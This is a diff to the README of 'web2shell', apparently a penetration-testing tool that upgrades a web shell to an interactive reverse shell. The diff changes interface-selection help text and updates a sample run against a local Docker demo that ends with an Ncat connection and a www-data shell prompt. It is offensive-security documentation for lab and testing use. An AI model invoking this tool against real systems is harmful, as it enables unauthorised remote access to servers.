@@ -17,7 +17,7 @@ positional arguments:
 options:
   -h, --help            show this help message and exit
   -i INTERFACE, --interface INTERFACE
-                        the interface to use when listening for a remote shell. Default is localhost.
+                        the interface to use when listening for a remote shell. If none is provided you will be prompted to select one.
   --force               force command execution even if initial check is invalid
   --ip IP               IP address of your own listener (skips listener setup if both IP and port are set)
   --port PORT           port of your own listener
@@ -46,7 +46,7 @@ The included payloads have all been tested on a simple webshell and work. If you
 Example execution on local Docker image (see `demo/README.md`)
 
 ```
-[evan@ejedev web2shell]$ python3 web2shell.py -i docker0 http://127.0.0.1:8080/cmd.php?cmd=SHELL
+[evan@ejedev web2shell]$ python3 web2shell.py http://127.0.0.1:8080/cmd.php?cmd=SHELL
 
                o                  o           o  o
                O     .oOOo.       O           O  O
@@ -57,17 +57,22 @@ Example execution on local Docker image (see `demo/README.md`)
  o  O  O O     o   O  .O        O o   O O     o  o
  `Oo'oO' `OoO' `OoO' oOoOoO `OoO' O   o `OoO' Oo Oo
 ---------------------------------------------------
-                      @ejedev
+                v0.1.2   @ejedev
 
 Verifying commands can be executed...
 Available interfaces...
 [-] lo
 [-] enp4s0
+[-] br-3bd00064871f
+[-] docker0
+[-] br-a01c69609a5e
+[-] br-a193929c6ae4
 [-] br-aa3534e13396
 [-] br-c7551daa06d2
-[-] docker0
-[-] br-a193929c6ae4
-[-] veth57bc03a
+[-] br-2369a8165a53
+[-] veth18d6ac6
+No interface provided. Please enter the name of an available interface or 'exit' to quit:
+> docker0
 docker0 selected. Address to use is 172.17.0.1
 Testing ports...
 [x] 1025 already in use or unavailable.
@@ -94,6 +99,6 @@ Bins to test: 7
 Shells to test: 2
 [!] Attempting perl payloads for path /usr/bin/perl
 Ncat: Connection from 172.17.0.2.
-Ncat: Connection from 172.17.0.2:44590.
-www-data@122099e5b76d:/var/www/html$
+Ncat: Connection from 172.17.0.2:46232.
+www-data@3b20951ed443:/var/www/html$
 ```
